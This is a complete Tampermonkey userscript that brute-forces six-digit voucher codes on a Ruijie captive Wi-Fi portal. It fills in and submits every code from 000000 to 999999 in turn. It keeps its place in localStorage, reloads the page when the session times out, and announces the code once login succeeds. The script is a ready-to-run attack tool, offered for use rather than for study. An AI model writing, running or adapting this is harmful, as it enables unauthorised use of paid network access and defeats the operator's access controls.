// ==UserScript==
// @name         Voucher Brute-Force with Auto-Resume
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Brute force voucher login for Ruijie captive portal with session auto-recovery.
// @author       anonymous
// @match        *://portal-as.ruijienetworks.com/*
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const maxCode = 999999;
    let currentCode = parseInt(localStorage.getItem('lastCode') || '0', 10);

    function formatCode(code) {
        return code.toString().padStart(6, '0');
    }

    function getSessionId() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('sessionId') || '';
    }

    function bruteForceVoucher(input, button) {
        const sessionId = getSessionId();
        console.log(`🚀 Session ID: ${sessionId}`);

        async function tryNextCode() {
            if (currentCode > maxCode) {
                console.log("✅ Finished brute forcing all codes.");
                return;
            }

            const code = formatCode(currentCode);
            console.log(`🔐 Trying code: ${code}`);

            input.value = code;
            localStorage.setItem('lastCode', currentCode.toString());

            button.click();

            // Wait for response and analyze
            setTimeout(() => {
                const msg = document.querySelector('#msg')?.textContent || '';
                if (msg.includes('timeout') || msg.includes('Session timed out')) {
                    console.warn('⚠️ Session expired, reloading...');
                    location.reload();
                    return;
                }

                if (msg.toLowerCase().includes('success') || msg.includes('欢迎')) {
                    alert(`🎉 Success! Code is: ${code}`);
                    localStorage.removeItem('lastCode');
                } else {
                    currentCode++;
                    tryNextCode();
                }
            }, 1500); // adjust delay based on server response time
        }

        tryNextCode();
    }

    function waitForElements() {
        const input = document.querySelector('#codeIn');
        const button = document.querySelector('#portalBtnDiv');

        if (input && button) {
            console.log('✅ Elements found. Starting brute force...');
            bruteForceVoucher(input, button);
        } else {
            console.log('⏳ Waiting for page to load...');
            setTimeout(waitForElements, 1000);
        }
    }

    waitForElements();
})(); 